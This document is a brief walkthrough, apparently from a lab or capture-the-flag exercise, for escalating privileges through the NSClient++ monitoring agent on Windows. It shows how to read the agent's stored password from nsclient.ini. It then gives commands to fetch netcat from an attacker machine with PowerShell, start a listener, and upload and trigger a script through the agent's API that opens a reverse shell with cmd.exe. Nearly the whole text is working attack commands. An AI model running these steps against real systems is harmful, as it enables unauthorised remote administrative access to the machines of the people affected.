
Check in program files if you found this `NSClient++` tool


### Check Password
if you can access this file you will be able to read the password
```powershell
more nsclient.ini
```


### Download and copy the netcat.exe

```bash
# download
wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe

# transfer it
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.6:8000/nc64.exe', 'nc.exe')"
```


###
set up a netcat listener on my machine:

```bash
sudo nc -lvnp 4444
```
###  Upload a reverse shell script
Upload a script that runs the binary and connects back:

```bash
curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/root.bat --data-binary "C:\Temp\nc.exe 10.10.14.6 4444 -e cmd.exe"
```
Trigger execution via queries API:
```bash
curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/root/commands/execute?time=3m
```

Now you will have the reverse connection at your attacker nc listener .


